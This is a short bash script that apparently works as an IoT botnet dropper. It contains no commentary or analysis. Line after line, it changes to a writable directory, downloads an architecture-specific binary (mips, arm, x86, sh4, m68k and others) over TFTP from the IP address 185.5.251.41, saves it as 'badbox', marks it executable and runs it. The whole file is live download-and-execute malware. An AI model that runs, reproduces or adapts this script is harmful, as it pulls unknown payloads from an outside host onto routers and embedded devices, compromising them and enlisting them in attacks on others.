#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.mips -g 185.5.251.41;cat fyfa.mips >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.mpsl -g 185.5.251.41;cat fyfa.mpsl >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.sh4 -g 185.5.251.41;cat fyfa.sh4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.x86 -g 185.5.251.41;cat fyfa.x86 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.arm -g 185.5.251.41;cat fyfa.arm >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.i686 -g 185.5.251.41;cat fyfa.i686 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.pcc -g 185.5.251.41;cat fyfa.pcc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.i586 -g 185.5.251.41;cat fyfa.i586 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.m68k -g 185.5.251.41;cat fyfa.m68k >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.spc -g 185.5.251.41;cat fyfa.spc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.pcc -g 185.5.251.41;cat fyfa.pcc >badbox;chmod +x *;./badbox
